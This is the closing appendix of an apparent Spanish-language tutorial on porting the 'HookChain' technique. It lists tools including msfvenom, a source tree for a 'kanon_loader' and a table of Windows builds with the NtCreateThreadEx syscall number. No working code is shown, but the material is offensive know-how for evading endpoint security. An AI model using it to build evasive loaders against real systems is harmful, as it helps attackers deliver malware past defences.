| x64dbg | https://x64dbg.com/ |
| mingw-w64 | https://www.mingw-w64.org/ |
| msfvenom | https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html |

---

## Apéndice A: Código completo de referencia

El código completo funcional está en:
```
/opt/data/workspace/proyectos/hookchain/port/
├── src/
│   ├── hookchain.S       # Assembly (2589 líneas, GAS .intel_syntax)
│   ├── hook.c            # Lógica core (1203 líneas)
│   └── kanon_loader.c    # Loader final (107 líneas)
├── include/
│   ├── hook.h            # Structs y prototipos
│   └── windows_common.h  # PEB, TEB, LDR definitions
├── tools/
│   └── gen_asm.py        # Generador de assembly
├── Makefile
└── bin/
    └── kanon_loader.exe  # Binario compilado
```

## Apéndice B: Versiones de Windows testeadas

| Build | ntdll stub tipo | SSN NtCreateThreadEx | Funciona |
|-------|----------------|---------------------|----------|
| Win11 24H2 (26100) | Inline syscall @ +0x12 | 0x00C9 | ✓ |
| Win10 22H2 (19045) | Inline syscall @ +0x12 | ~0xC7-C9 | No testeado |

---

**Fin del tutorial.**

*"If you can't build it from scratch, you don't understand it."*
